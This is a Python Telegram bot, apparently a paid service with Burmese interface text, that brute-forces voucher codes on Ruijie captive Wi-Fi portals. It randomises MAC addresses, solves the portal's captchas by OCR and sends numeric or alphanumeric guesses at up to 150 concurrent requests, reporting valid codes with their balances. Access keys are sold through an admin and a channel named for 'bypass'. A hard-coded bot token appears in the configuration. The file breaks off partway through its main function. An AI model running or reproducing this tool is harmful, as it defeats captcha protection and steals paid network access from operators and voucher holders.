#!/usr/init/env python3
import re
import json
import base64
import random
import string
import time
import asyncio
import aiohttp
import cv2
import ddddocr
import numpy as np
import os
import gc
import logging
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application,
    CommandHandler,
    CallbackQueryHandler,
    MessageHandler,
    ContextTypes,
    filters,
)

# ── LOGGING CONFIGURATION ────────────────────────────────────────────────
logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s", level=logging.INFO
)
logger = logging.getLogger(__name__)

# ── CONFIGURATION ──────────────────────────────────────────────────────────
BOT_TOKEN = "8648844261:AAGb737MMCYlLYUPG2uzHNC7TsiFi1SX2sY"
ADMIN_ID = 8635066797                                      

REQUIRED_CHANNEL = "@Ruijie_Bypass_And_Turmux"  # မဖြစ်မနေ Join ရမည့်ချန်နယ်

BATCH_SIZE = 1000        
MAX_CONCURRENT = 150     
CONNECTION_LIMIT = 200
TIMEOUT = 20

DEFAULT_FREE_LIMIT = 15 * 60  
ADMIN_CONTACT_USERNAME = "@O_DIN_SAR_MA"

# ── GLOBALS & PERSISTENT MEMORY ──────────────────────────────────────────
_connector = None
_ocr = None
DIGITS = list(string.digits)
LOWERCASE_CHARS = list(string.ascii_lowercase)  # အင်္ဂလိပ်စာလုံးအသေး (a-z)
MIXED_CHARS = list(string.ascii_lowercase + string.digits) # အင်္ဂလိပ်စာလုံးအသေး + ဂဏန်း

user_scans = {}          
user_usage = {}          
all_users = set()        
generated_keys = {}      
user_subscriptions = {}  
blocked_users = set()    
global_lock = False      

# ── OCR INITIALIZATION ───────────────────────────────────────────────────
def init_ocr():
    global _ocr
    if _ocr is None:
        try:
            _ocr = ddddocr.DdddOcr(show_ad=False)
        except Exception as e:
            logger.error(f"OCR Init Error: {e}")

def _ocr_sync(image_bytes):
    try:
        init_ocr()
        nparr = np.frombuffer(image_bytes, np.uint8)
        img = cv2.imdecode(nparr, cv2.IMREAD_GRAYSCALE)
        if img is None:
            return None
        _, buffer = cv2.imencode('.png', img)
        return _ocr.classification(buffer.tobytes()).upper()
    except Exception:
        return None

# ── CHANNEL MEMBERSHIP CHECK (FORCE SUBSCRIBE) ───────────────────────────
async def check_channel_membership(user_id: int, context: ContextTypes.DEFAULT_TYPE) -> bool:
    if is_admin(user_id):
        return True
    try:
        member = await context.bot.get_chat_member(chat_id=REQUIRED_CHANNEL, user_id=user_id)
        if member.status in ["member", "administrator", "creator", "owner"]:
            return True
    except Exception as e:
        logger.warning(f"Channel membership check error for {user_id}: {e}")
    return False

# ── HELPER FUNCTIONS ─────────────────────────────────────────────────────

def is_admin(user_id: int) -> bool:
    return user_id == ADMIN_ID

def check_user_limit(user_id: int) -> tuple[bool, str]:
    if is_admin(user_id):
        return True, "VIP Admin"

    if user_id in blocked_users or global_lock:
        return False, "Blocked by Admin"

    current_time = time.time()
    
    if user_id in user_subscriptions:
        if current_time < user_subscriptions[user_id]:
            remaining_days = int((user_subscriptions[user_id] - current_time) / 86400) + 1
            return True, f"VIP (ကျန်ရက်: {remaining_days} ရက်)"
        else:
            del user_subscriptions[user_id]

    today_str = time.strftime("%Y-%m-%d")
    if user_id not in user_usage:
        user_usage[user_id] = {'date': today_str, 'used_time': 0}
    if user_usage[user_id]['date'] != today_str:
        user_usage[user_id] = {'date': today_str, 'used_time': 0}
        
    remaining = DEFAULT_FREE_LIMIT - user_usage[user_id]['used_time']
    if remaining <= 0:
        return False, "Expired"
    return True, f"Free (ကျန်ချိန်: {int(remaining/60)} မိနစ်)"

# ── CODE GENERATORS (Digits, Letters & Mixed) ───────────────────────────

def iter_digit_codes(mode):
    if mode in ["6", "7", "8", "9"]:
        length = int(mode)
        if mode in ["6", "7"]:
            codes = [str(i).zfill(length) for i in range(10 ** length)]
            random.shuffle(codes)
            yield from codes
            return
        if mode == "8":
            ranges = list(range(0, 100, 10))
            random.shuffle(ranges)
            for start_range in ranges:
                start = start_range * 1000000
                end = (start_range + 10) * 1000000
                chunk_codes = [str(i).zfill(8) for i in range(start, end)]
                random.shuffle(chunk_codes)
                yield from chunk_codes
                gc.collect()
                
    elif mode in ["alpha_6", "alpha_7"]:
        # အင်္ဂလိပ်စာလုံးအသေး (a-z) သက်သက် ၆ လုံး သို့မဟုတ် ၇ လုံး
        length = 6 if mode == "alpha_6" else 7
        while True:
            chunk = [''.join(random.choices(LOWERCASE_CHARS, k=length)) for _ in range(50000)]
            yield from chunk
            gc.collect()
            
    elif mode in ["mixed_6", "mixed_7"]:
        # အင်္ဂလိပ်စာလုံးအသေး (a-z) + ဂဏန်း (0-9) ရောနှော ၆ လုံး သို့မဟုတ် ၇ လုံး
        length = 6 if mode == "mixed_6" else 7
        while True:
            chunk = [''.join(random.choices(MIXED_CHARS, k=length)) for _ in range(50000)]
            yield from chunk
            gc.collect()

def get_mac():
    return ':'.join(f'{random.randint(0x00, 0xff):02x}' for _ in range(6))

def replace_mac(url, new_mac):
    return re.sub(r'(?<=mac=)[^&]+', new_mac, url)

async def get_session_id(session_obj, session_url, prev_sid=None):
    mac = get_mac()
    url = replace_mac(session_url, new_mac=mac)
    headers = {'user-agent': 'Mozilla/5.0 (Linux; Android 12) AppleWebKit/537.36', 'accept': 'text/html'}
    try:
        async with session_obj.get(url, headers=headers, allow_redirects=True, timeout=5) as req:
            sid = re.search(r"[?&]sessionId=([a-zA-Z0-9]+)", str(req.url))
            return sid.group(1) if sid else prev_sid
    except Exception:
        return prev_sid

async def Captcha_Image(session_obj, session_id):
    params = {'sessionId': session_id, '_t': str(time.time())}
    headers = {'user-agent': 'Mozilla/5.0 (Linux; Android 12) AppleWebKit/537.36'}
    try:
        async with session_obj.get('https://portal-as.ruijienetworks.com/api/auth/captcha/image', params=params, headers=headers, timeout=5) as req:
            return await req.read()
    except Exception:
        return None

async def Captcha_Text(image_bytes):
    return await asyncio.to_thread(_ocr_sync, image_bytes)

async def Varify_Captcha(session_obj, session_id, text):
    json_data = {'sessionId': session_id, 'authCode': text}
    headers = {'user-agent': 'Mozilla/5.0 (Linux; Android 12) AppleWebKit/537.36', 'content-type': 'application/json'}
    try:
        async with session_obj.post('https://portal-as.ruijienetworks.com/api/auth/captcha/verify', headers=headers, json=json_data, timeout=5) as req:
            data = await req.json()
            return session_id if data.get("success") else None
    except Exception:
        return None

async def get_balance_info(session_id):
    endpoint = f"https://portal-as.ruijienetworks.com/api/auth/balance/getBalance/{session_id}"
    headers = {'user-agent': 'Mozilla/5.0 (Linux; Android 12) AppleWebKit/537.36', 'accept': 'application/json'}
    try:
        async with aiohttp.ClientSession() as temp_session:
            async with temp_session.get(endpoint, headers=headers, timeout=5) as resp:
                if resp.status == 200:
                    data = await resp.json()
                    if data.get("success", False):
                        result = data.get("result", {}) or data.get("data", {})
                        minutes = result.get('totalMinutes') or result.get('remainingMinutes') or 0
                        plan_name = result.get("profileName", "Unknown")
                        return f"📋 {plan_name} | ⏱ {float(minutes)}m"
    except Exception:
        pass
    return "📋 Unknown | ⏱ N/A"

async def perform_check(session_url, code):
    post_url = "https://portal-as.ruijienetworks.com/api/auth/voucher/?lang=en_US"
    timeout = aiohttp.ClientTimeout(total=8, connect=2)
    try:
        async with aiohttp.ClientSession(connector=_connector, connector_owner=False, timeout=timeout) as task_session:
            session_id = await get_session_id(task_session, session_url)
            if not session_id: return None
            image = await Captcha_Image(task_session, session_id)
            if not image: return None
            text = await Captcha_Text(image)
            if not text: return None
            if not await Varify_Captcha(task_session, session_id, text): return None
            
            data = {"accessCode": code, "sessionId": session_id, "apiVersion": 1, "authCode": text}
            headers = {"user-agent": "Mozilla/5.0 (Linux; Android 12) AppleWebKit/537.36", "content-type": "application/json"}
            async with task_session.post(post_url, json=data, headers=headers, timeout=5) as req:
                response = await req.text()
                if 'logonUrl' in response:
                    balance_display = await get_balance_info(session_id)
                    return {"code": code, "balance": balance_display}
    except Exception:
        pass
    return None

# ── TELEGRAM HANDLERS ────────────────────────────────────────────────----

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        user_id = update.effective_user.id
        all_users.add(user_id)

        is_member = await check_channel_membership(user_id, context)
        if not is_member:
            keyboard = [
                [InlineKeyboardButton("📢 ချန်နယ်သို့ဝင်ရန် (Join)", url=f"https://t.me/{REQUIRED_CHANNEL.replace('@', '')}")],
                [InlineKeyboardButton("🔄 စစ်ဆေးမည် (Check Again)", callback_data="check_subscription")]
            ]
            await update.message.reply_text(
                f"❌ ကျေးဇူးပြု၍ Bot ကို အသုံးပြုရန် ပထမဦးစွာ ကျွန်ုပ်တို့၏ချန်နယ်ကို **Join** လုပ်ထားပေးပါ။\n\n"
                f"🔗 ချန်နယ်: {REQUIRED_CHANNEL}\n\n"
                f"Join ပြီးပါက အောက်ပါ **စစ်ဆေးမည်** ခလုတ်ကို နှိပ်ပါ 👇",
                reply_markup=InlineKeyboardMarkup(keyboard)
            )
            return

        can_use, status_text = check_user_limit(user_id)
        if not can_use:
            if status_text == "Blocked by Admin":
                await update.message.reply_text("❌ Admin မှ ဤ Bot ကို ယာယီပိတ်ပင်ထားပါသည် (သို့) သင့်အကောင့်ကို ပိတ်ထားပါသည်။")
            else:
                await update.message.reply_text(
                    f"❌ သင့်ရဲ့ နေ့စဉ် အသုံးပြုခွင့် ၁၅ မိနစ် ကုန်ဆုံးသွားပါပြီ။\n"
                    f"ကျေးဇူးပြု၍ Key ဝယ်ယူပြီး အသုံးချလိုပါက {ADMIN_CONTACT_USERNAME} ထံသို့ ဆက်သွယ်ဝယ်ယူပါ။\n\n"
                    f"💡 (သို့) ဝယ်ယူထားသော Key ရှိပါက `/redeem <သင့်ရဲ့Key>` ဆိုပြီး ပို့ပေးပါ။"
                )
            return

        user_scans[user_id] = {
            'url': None, 'running': False, 'mode': '6',
            'found_codes': [], 'checked': 0, 'start_time': 0, 'task': None
        }
        
        if is_admin(user_id):
            keyboard = [
                [InlineKeyboardButton("🛠️ Admin Panel သို့ဝင်ရန်", callback_data="admin_panel")],
                [InlineKeyboardButton("🚀 Scan စတင်ရန်", callback_data="start_scan")]
            ]
            await update.message.reply_text(f"👑 **Admin Dashboard**\n status: {status_text}", reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')
        else:
            msg = f"🔥 **RUIJIE EXTREME SCANNER BOT** 🔥\n\n📌 အခြေအနေ: {status_text}\n\nစတင်ရန် Portal URL ကို ပေးပို့ပါ သို့မဟုတ် Key ထည့်ရန် `/redeem KEY` ကို အသုံးပြုပါ။"
            await update.message.reply_text(msg, parse_mode='Markdown')
    except Exception as e:
        logger.error(f"Start Error: {e}")

async def redeem_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if global_lock or user_id in blocked_users:
        await update.message.reply_text("❌ Admin မှ Bot အသုံးပြုမှုကို ပိတ်ထားပါသည်။")
        return

    if not await check_channel_membership(user_id, context):
        await update.message.reply_text(f"❌ ကျေးဇူးပြု၍ {REQUIRED_CHANNEL} ကို ဦးစွာ Join ပေးပါ။")
        return

    args = context.args
    if not args:
        await update.message.reply_text("❌ ကျေးဇူးပြု၍ Key ထည့်ပါရန်။ (ဥပမာ: `/redeem RUIJIE-XXXXXX`)", parse_mode='Markdown')
        return

    key_input = args[0].strip()
    if key_input not in generated_keys:
        await update.message.reply_text("❌ ထည့်သွင်းလိုက်သော Key မှာ မှားယွင်းနေပါသည် သို့မဟုတ် မရှိပါ။")
        return

    key_data = generated_keys[key_input]
    if key_data['used']:
        await update.message.reply_text("❌ ဤ Key မှာ အသုံးပြုပြီးသား ဖြစ်ပါသည်။")
        return

    days = key_data['days']
    key_data['used'] = True
    
    current_time = time.time()
    if user_id in user_subscriptions and user_subscriptions[user_id] > current_time:
        user_subscriptions[user_id] += (days * 86400)
    else:
        user_subscriptions[user_id] = current_time + (days * 86400)

    await update.message.reply_text(
        f"✅ **Key အောင်မြင်စွာ ဖွင့်လိုက်ပါပြီ!**\n\n"
        f"🎁 သင့်အား **{days} ရက်စာ** အသုံးပြုခွင့် ပေးအပ်လိုက်ပါပြီ။\n"
        f"ယခုမှစ၍ Bot ကို စိတ်ကြိုက် ဆက်လက်အသုံးပြုနိုင်ပါပြီ 🚀",
        parse_mode='Markdown'
    )

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        user_id = update.effective_user.id
        
        if not is_admin(user_id) and (global_lock or user_id in blocked_users):
            await update.message.reply_text("❌ Admin မှ Bot ကို ပိတ်ထားပါသည်။")
            return

        if not await check_channel_membership(user_id, context):
            await update.message.reply_text(f"❌ ကျေးဇူးပြု၍ {REQUIRED_CHANNEL} ကို ဦးစွာ Join ပေးပါ။")
            return

        text = update.message.text.strip()
        
        if is_admin(user_id) and context.user_data.get('waiting_broadcast'):
            context.user_data['waiting_broadcast'] = False
            count = 0
            for uid in all_users:
                try:
                    await context.bot.send_message(chat_id=uid, text=f"📢 **Admin ထံမှ အသိပေးချက်။**\n\n{text}", parse_mode='Markdown')
                    count += 1
                except Exception:
                    pass
            await update.message.reply_text(f"✅ User {count} ဦးထံသို့ စာပို့ပြီးပါပြီ။")
            return

        if is_admin(user_id) and context.user_data.get('waiting_block_action'):
            action = context.user_data.pop('waiting_block_action')
            try:
                target_id = int(text)
                if action == "block":
                    blocked_users.add(target_id)
                    await update.message.reply_text(f"🚫 User ID `{target_id}` ကို အောင်မြင်စွာ ပိတ်လိုက်ပါပြီ။", parse_mode='Markdown')
                elif action == "unban":
                    if target_id in blocked_users:
                        blocked_users.remove(target_id)
                        await update.message.reply_text(f"✅ User ID `{target_id}` ကို ပြန်လည်ဖွင့်ပေးလိုက်ပါပြီ။", parse_mode='Markdown')
                    else:
                        await update.message.reply_text(f"⚠️ ဤ User ID (`{target_id}`) မှာ ပိတ်ထားသော စာရင်းထဲတွင် မရှိပါ။", parse_mode='Markdown')
            except ValueError:
                await update.message.reply_text("❌ ကျေးဇူးပြု၍ မှန်ကန်သော ဂဏန်း User ID ကိုသာ ရိုက်ထည့်ပါ။")
            return

        can_use, _ = check_user_limit(user_id)
        if not can_use:
            await update.message.reply_text(f"❌ အသုံးပြုခွင့် ကုန်ဆုံးသွားပါပြီ။ {ADMIN_CONTACT_USERNAME} ထံတွင် Key ဝယ်ယူနိုင်ပါသည်။")
            return

        if user_id not in user_scans:
            user_scans[user_id] = {'url': None, 'running': False, 'mode': '6', 'found_codes': [], 'checked': 0, 'start_time': 0, 'task': None}
        
        if "portal-as.ruijienetworks.com" in text or "mac=" in text:
            if "mac=" not in text:
                text += "&mac=02:00:00:00:00:00" if "?" in text else "?mac=02:00:00:00:00:00"
            user_scans[user_id]['url'] = text
            await show_main_menu(update, context)
        else:
            await update.message.reply_text("❌ မှန်ကန်သော Portal URL မဟုတ်ပါ။")
    except Exception as e:
        logger.error(f"Message Handler Error: {e}")

async def show_main_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        user_id = update.effective_user.id
        state = user_scans[user_id]
        keyboard = [
            [InlineKeyboardButton("🔢 Mode ရွေးချယ်ရန်", callback_data="select_mode")],
            [InlineKeyboardButton("🚀 Scan စတင်ရန်", callback_data="start_scan"), InlineKeyboardButton("⏹️ ရပ်တန့်ရန်", callback_data="stop_scan")],
            [InlineKeyboardButton("📋 တွေ့ရှိထားသော Code များ", callback_data="view_codes")]
        ]
        if is_admin(user_id):
            keyboard.append([InlineKeyboardButton("🛠️ Admin Panel", callback_data="admin_panel")])
            
        reply_markup = InlineKeyboardMarkup(keyboard)
        status = "🟢 Running" if state['running'] else "🔴 Stopped"
        msg = f"⚙️ **Dashboard**\n\n🔗 **URL:** `{str(state['url'])[:30]}...`\n⚡ **Status:** {status}"
        
        if update.message:
            await update.message.reply_text(msg, reply_markup=reply_markup, parse_mode='Markdown')
        else:
            await update.callback_query.edit_message_text(msg, reply_markup=reply_markup, parse_mode='Markdown')
    except Exception as e:
        logger.error(f"Menu Error: {e}")

async def callback_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        global global_lock
        query = update.callback_query
        user_id = query.from_user.id
        data = query.data
        await query.answer()

        if data == "check_subscription":
            is_member = await check_channel_membership(user_id, context)
            if is_member:
                await query.edit_message_text("✅ ကျေးဇူးတင်ပါသည်။ ချန်နယ် Join ပြီးသားဖြစ်ပါသည်၊ /start ကိုထပ်နှိပ်ပြီး Bot ကို အသုံးပြုနိုင်ပါပြီ။")
            else:
                await query.answer("❌ သင်သည် ချန်နယ်ကို မ Join ရသေးပါ သို့မဟုတ် Bot ကို Admin မတင်ရသေးပါ။", show_alert=True)
            return

        if not is_admin(user_id) and (global_lock or user_id in blocked_users):
            await query.answer("❌ Admin မှ Bot ကို ပိတ်ထားပါသည်။", show_alert=True)
            return

        if not await check_channel_membership(user_id, context):
            await query.answer(f"❌ ကျေးဇူးပြု၍ {REQUIRED_CHANNEL} ကို ဦးစွာ Join ပေးပါ။", show_alert=True)
            return

        if data == "admin_panel":
            if not is_admin(user_id):
                await query.answer("❌ ခွင့်ပြုချက်မရှိပါ။", show_alert=True)
                return
            lock_status = "🔴 အားလုံး ပိတ်ထားသည်" if global_lock else "🟢 အားလုံး ဖွင့်ထားသည်"
            keyboard = [
                [InlineKeyboardButton(f"🔒 All Users: {lock_status}", callback_data="toggle_global_lock")],
                [InlineKeyboardButton("👥 Bot သုံးနေသူ စုစုပေါင်း ကြည့်ရန်", callback_data="admin_stats")],
                [InlineKeyboardButton("📡 Scan ဖတ်နေသူများ ကြည့်ရန်", callback_data="admin_active_scans")],
                [InlineKeyboardButton("🚫 User တစ်ဦးချင်း ပိတ်ရန်/ဖွင့်ရန်", callback_data="admin_block_menu")],
                [InlineKeyboardButton("🔑 15 ရက်စာ Key ထုတ်ရန်", callback_data="gen_key_15"), InlineKeyboardButton("🔑 20 ရက်စာ Key ထုတ်ရန်", callback_data="gen_key_20")],
                [InlineKeyboardButton("🔑 30 ရက်စာ Key ထုတ်ရန်", callback_data="gen_key_30")],
                [InlineKeyboardButton("✉️ User အားလုံးကို စာပို့ရန် (Broadcast)", callback_data="admin_broadcast")],
                [InlineKeyboardButton("⬅️ Back", callback_data="main_menu")]
            ]
            await query.edit_message_text("🛠️ **Admin Control Panel**\n\nလိုချင်သော လုပ်ဆောင်ချက်ကို ရွေးချယ်ပါ:", reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')
            return

        if data == "toggle_global_lock":
            if not is_admin(user_id): return
            global_lock = not global_lock
            status_text = "ပိတ်လိုက်ပါပြီ (Global Locked)" if global_lock else "ပြန်ဖွင့်ပေးလိုက်ပါပြီ (Global Unlocked)"
            await query.answer(f"✅ Bot အသုံးပြုမှုကို {status_text}", show_alert=True)
            
            lock_status = "🔴 အားလုံး ပိတ်ထားသည်" if global_lock else "🟢 အားလုံး ဖွင့်ထားသည်"
            keyboard = [
                [InlineKeyboardButton(f"🔒 All Users: {lock_status}", callback_data="toggle_global_lock")],
                [InlineKeyboardButton("👥 Bot သုံးနေသူ စုစုပေါင်း ကြည့်ရန်", callback_data="admin_stats")],
                [InlineKeyboardButton("📡 Scan ဖတ်နေသူများ ကြည့်ရန်", callback_data="admin_active_scans")],
                [InlineKeyboardButton("🚫 User တစ်ဦးချင်း ပိတ်ရန်/ဖွင့်ရန်", callback_data="admin_block_menu")],
                [InlineKeyboardButton("🔑 15 ရက်စာ Key ထုတ်ရန်", callback_data="gen_key_15"), InlineKeyboardButton("🔑 20 ရက်စာ Key ထုတ်ရန်", callback_data="gen_key_20")],
                [InlineKeyboardButton("🔑 30 ရက်စာ Key ထုတ်ရန်", callback_data="gen_key_30")],
                [InlineKeyboardButton("✉️ User အားလုံးကို စာပို့ရန် (Broadcast)", callback_data="admin_broadcast")],
                [InlineKeyboardButton("⬅️ Back", callback_data="main_menu")]
            ]
            await query.edit_message_text("🛠️ **Admin Control Panel**\n\nလိုချင်သော လုပ်ဆောင်ချက်ကို ရွေးချယ်ပါ:", reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')
            return

        if data == "admin_block_menu":
            if not is_admin(user_id): return
            keyboard = [
                [InlineKeyboardButton("🚫 User တစ်ဦးကို ပိတ်ရန် (Ban)", callback_data="action_block_user")],
                [InlineKeyboardButton("✅ User တစ်ဦးကို ပြန်ဖွင့်ရန် (Unban)", callback_data="action_unban_user")],
                [InlineKeyboardButton("📋 ပိတ်ထားသူများစာရင်း ကြည့်ရန်", callback_data="action_list_blocked")],
                [InlineKeyboardButton("⬅️ Back", callback_data="admin_panel")]
            ]
            await query.edit_message_text("⚙️ **Single User Management**\n\nလုပ်ဆောင်လိုသည်ကို ရွေးချယ်ပါ:", reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')
            return

        if data == "action_block_user":
            if not is_admin(user_id): return
            context.user_data['waiting_block_action'] = "block"
            keyboard = [[InlineKeyboardButton("⬅️ Back", callback_data="admin_block_menu")]]
            await query.edit_message_text("🚫 ပိတ်လိုသော **User ID** (ဥပမာ - `123456789`) ကို စာပို့ပေးပါ:", reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')
            return

        if data == "action_unban_user":
            if not is_admin(user_id): return
            context.user_data['waiting_block_action'] = "unban"
            keyboard = [[InlineKeyboardButton("⬅️ Back", callback_data="admin_block_menu")]]
            await query.edit_message_text("✅ ပြန်ဖွင့်ပေးလိုသော **User ID** ကို စာပို့ပေးပါ:", reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')
            return

        if data == "action_list_blocked":
            if not is_admin(user_id): return
            text = "🚫 **ပိတ်ပင်ထားသော User များ:**\n\n"
            if not blocked_users:
                text += "📭 ပိတ်ထားသူ မရှိပါ။"
            else:
                for uid in blocked_users:
                    text += f"- ID: `{uid}`\n"
            keyboard = [[InlineKeyboardButton("⬅️ Back", callback_data="admin_block_menu")]]
            await query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')
            return

        if data in ["gen_key_15", "gen_key_20", "gen_key_30"]:
            if not is_admin(user_id): return
            days = 15 if data == "gen_key_15" else (20 if data == "gen_key_20" else 30)
            key_code = f"RUIJIE-{days}D-" + ''.join(random.choices(string.ascii_uppercase + string.digits, k=6))
            generated_keys[key_code] = {'days': days, 'used': False}
            
            text = f"🔑 **{days} ရက်စာ Key အသစ်ထုတ်ပေးပြီးပါပြီ:**\n\n`{key_code}`\n\n(ဤ Key ကို ဝယ်ယူသူထံ ပေးပို့နိုင်ပါသည်)"
            keyboard = [
                [InlineKeyboardButton("🔄 ထပ်ထုတ်ရန်", callback_data=data)],
                [InlineKeyboardButton("⬅️ Back", callback_data="admin_panel")]
            ]
            await query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')
            return

        if data == "admin_stats":
            active_scans_count = sum(1 for s in user_scans.values() if s['running'])
            text = f"📊 **Bot Statistics**\n\n👤 စုစုပေါင်း Users: `{len(all_users)}` ဦး\n⚡ Active Scans: `{active_scans_count}` ဦး\n🔒 Global Lock: `{'ON' if global_lock else 'OFF'}`\n🚫 Blocked Users: `{len(blocked_users)}` ဦး"
            keyboard = [[InlineKeyboardButton("⬅️ Back", callback_data="admin_panel")]]
            await query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')
            return

        if data == "admin_active_scans":
            text = "📡 **လက်ရှိ Scan ဖတ်နေသူများ:**\n\n"
            count = 0
            for uid, state in user_scans.items():
                if state['running']:
                    count += 1
                    text += f"- ID: `{uid}` | Mode: `{state['mode']}` | Checked: `{state['checked']:,}`\n"
            if count == 0: text += "📭 မည်သူမျှ Scan မဖတ်နေပါ။"
            keyboard = [[InlineKeyboardButton("⬅️ Back", callback_data="admin_panel")]]
            await query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')
            return

        if data == "admin_broadcast":
            context.user_data['waiting_broadcast'] = True
            text = "✉️ User အားလုံးဆီ ပို့လိုသော **စာသား** ကို ပို့ပါ။"
            keyboard = [[InlineKeyboardButton("⬅️ Back", callback_data="admin_panel")]]
            await query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')
            return

        if data == "main_menu":
            if is_admin(user_id): await show_main_menu(update, context)
            return

        if user_id not in user_scans:
            user_scans[user_id] = {'url': None, 'running': False, 'mode': '6', 'found_codes': [], 'checked': 0, 'start_time': 0, 'task': None}

        state = user_scans[user_id]

        if data == "select_mode":
            keyboard = [
                [InlineKeyboardButton("6 Digit", callback_data="set_6"), InlineKeyboardButton("7 Digit", callback_data="set_7")],
                [InlineKeyboardButton("8 Digit", callback_data="set_8")],
                [InlineKeyboardButton("🔤 a-z (6)", callback_data="set_alpha_6"), InlineKeyboardButton("🔤 a-z (7)", callback_data="set_alpha_7")],
                [InlineKeyboardButton("🔀 Mixed (6)", callback_data="set_mixed_6"), InlineKeyboardButton("🔀 Mixed (7)", callback_data="set_mixed_7")],
                [InlineKeyboardButton("⬅️ Back", callback_data="main_menu")]
            ]
            await query.edit_message_text("🔢 **Mode ရွေးပါ:**", reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')

        elif data.startswith("set_"):
            mode = data.replace("set_", "")
            state['mode'] = mode
            await query.edit_message_text(f"✅ Mode ကို **{mode}** သို့ ပြောင်းပြီးပါပြီ။")
            await asyncio.sleep(1)
            await show_main_menu(update, context)

        elif data == "start_scan":
            if state['running']:
                await query.edit_message_text("⚠️ Scan ပတ်နေဆဲပါ။")
                return
            if not state['url']:
                await query.edit_message_text("❌ URL မရှိသေးပါ။")
                return
            state['running'] = True
            state['checked'] = 0
            state['start_time'] = time.time()
            state['task'] = asyncio.create_task(run_scan_task(user_id, context, query.message.chat_id, query.message.message_id))
            await query.edit_message_text("🚀 **Scan စတင်နေပါပြီ...**")

        elif data == "stop_scan":
            if state['running']:
                state['running'] = False
                if state['task']: state['task'].cancel()
                await query.edit_message_text("⏹️ Scan ရပ်တန့်လိုက်ပါပြီ။")

        elif data == "view_codes":
            codes = state['found_codes']
            text = "📭 မည်သည့် Code မှ မတွေ့သေးပါ။" if not codes else "🔥 **တွေ့ရှိထားသော Code များ:**\n\n" + "\n".join([f"- `{c['code']}` | {c['balance']}" for c in codes])
            keyboard = [[InlineKeyboardButton("⬅️ Back", callback_data="main_menu")]]
            await query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')
    except Exception as e:
        logger.error(f"Callback Error: {e}")

# ── BACKGROUND SCAN TASK ────────────────────────────────────────────────

async def run_scan_task(user_id, context, chat_id, message_id):
    state = user_scans[user_id]
    mode = state['mode']
    code_iter = iter_digit_codes(mode)
    sem = asyncio.Semaphore(MAX_CONCURRENT)

    async def _worker(code):
        async with sem:
            if not state['running']: return None
            return await perform_check(state['url'], code)

    last_update_time = time.time()
    task_start_time = time.time()

    try:
        while state['running']:
            if global_lock or user_id in blocked_users:
                state['running'] = False
                await context.bot.send_message(chat_id=chat_id, text="❌ Admin မှ Bot ကို ပိတ်လိုက်သဖြင့် Scan ကို ရပ်တန့်လိုက်ပါပြီ။")
                break

            if not await check_channel_membership(user_id, context):
                state['running'] = False
                await context.bot.send_message(chat_id=chat_id, text=f"❌ ချန်နယ်ကို ထွက်သွားသည်/မ Join ရသေးသဖြင့် Scan ကို ရပ်တန့်လိုက်ပါပြီ။ ({REQUIRED_CHANNEL})")
                break

            can_use, _ = check_user_limit(user_id)
            if not can_use:
                state['running'] = False
                await context.bot.send_message(
                    chat_id=chat_id, 
                    text=f"⏰ အသုံးပြုခွင့် သက်တမ်း ကုန်ဆုံးသွားပါပြီ။ {ADMIN_CONTACT_USERNAME} ထံတွင် Key ထပ်မံဝယ်ယူပါ။"
                )
                break

            batch = [next(code_iter) for _ in range(BATCH_SIZE)]
            results = await asyncio.gather(*[_worker(c) for c in batch], return_exceptions=True)

            for res in results:
                if isinstance(res, dict) and res:
                    state['found_codes'].append(res)
                    try:
                        await context.bot.send_message(chat_id=chat_id, text=f"🎉 **Code တွေ့ရှိသည်!**\n\n🔑 Code: `{res['code']}`\n{res['balance']}", parse_mode='Markdown')
                    except Exception:
                        pass

            state['checked'] += len(batch)
            current_elapsed = time.time() - task_start_time
            task_start_time = time.time()
            
            if user_id not in user_subscriptions:
                today_str = time.strftime("%Y-%m-%d")
                if user_id in user_usage and user_usage[user_id]['date'] == today_str:
                    user_usage[user_id]['used_time'] += current_elapsed

            if time.time() - last_update_time > 6:
                elapsed = time.time() - state['start_time']
                speed = (state['checked'] / elapsed * 60) if elapsed > 0 else 0
                status_msg = f"⚡ **Scanning...**\n📦 Checked: {state['checked']:,}\n⚡ Speed: {speed:,.0f}/min"
                keyboard = [[InlineKeyboardButton("⏹️ ရပ်တန့်ရန်", callback_data="stop_scan")]]
                try:
                    await context.bot.edit_message_text(chat_id=chat_id, message_id=message_id, text=status_msg, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')
                except Exception:
                    pass
                last_update_time = time.time()
            
            await asyncio.sleep(1.0)
    except asyncio.CancelledError:
        pass
    except Exception as e:
        logger.error(f"Scan Task Error: {e}")
    finally:
        state['running'] = False

# ── GLOBAL ERROR HANDLER ─────────────────────────────────────────────────

async def error_handler(update: object, context: ContextTypes.DEFAULT_TYPE):
    logger.error(msg="Exception while handling an update:", exc_info=context.error)

# ── MAIN ─────────────────────────────────────────────────────────────────

async def post_init(application: Application):
    global _connector
    _connector = aiohttp.TCPConnector(limit=CONNECTION_LIMIT, enable_cleanup_closed=True, force_close=False)

def main():
    app = Application.builder().token(BOT_TOKEN).post_init(post_init).build()
    
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("redeem", redeem_command))
    app.add_handler(CallbackQueryHandler(callback_handler))
